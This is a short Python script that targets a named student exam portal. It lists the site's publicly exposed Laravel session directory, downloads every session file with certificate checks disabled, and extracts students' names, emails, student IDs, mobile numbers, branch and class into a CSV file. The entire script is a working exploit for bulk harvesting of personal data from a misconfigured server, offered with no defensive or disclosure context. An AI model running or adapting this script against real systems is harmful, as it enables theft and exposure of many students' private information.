import requests, re, csv, sys, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://student.citexams.in"
SESS_DIR = f"{BASE}/storage/framework/sessions/"

def decode_php_serialized(text):
     # Simple regex extraction for specific keys
     def extract(key):
         # matches s:length:"value"
         match = re.search(rf'"{key}";s:\d+:"([^"]+)"', text)
         if match:
             return match.group(1)
         # matches i:123
         match = re.search(rf'"{key}";i:(\d+)', text)
         if match:
             return match.group(1)
         return ""
     return {
         "name": extract("student_name") or extract("user_name"),
         "email": extract("email"),
         "student_id": extract("student_id"),
         "customer_id": extract("customer_id"),
         "mobile": extract("mobile_no"),
         "branch": extract("branch_name"),
         "class": extract("class_name"),
         "url": extract("url"),
     }

resp = requests.get(SESS_DIR, verify=False)
filenames = re.findall(r'href="([a-fA-F0-9]{40})"', resp.text)
print(f"Found {len(filenames)} session files. Downloading...")

data_rows = []
for i, fname in enumerate(filenames):
    try:
        url = f"{BASE}/storage/framework/sessions/{fname}"
        r = requests.get(url, verify=False, timeout=5)
        info = decode_php_serialized(r.text)
        data_rows.append([fname, info['name'], info['email'], info['student_id'], info['mobile'], info['branch'], info['class'], info['url']])
        if (i+1) % 50 == 0:
            print(f"Downloaded {i+1}/{len(filenames)}")
    except Exception as e:
        print(f"Error on {fname}: {e}")

with open('students_sessions.csv', 'w', newline='', encoding='utf-8') as f:
    writer = csv.writer(f)
    writer.writerow(['SessionID', 'Name', 'Email', 'StudentID', 'Mobile', 'Branch', 'Class', 'LastURL'])
    writer.writerows(data_rows)

print(f"Done. Saved {len(data_rows)} records to students_sessions.csv")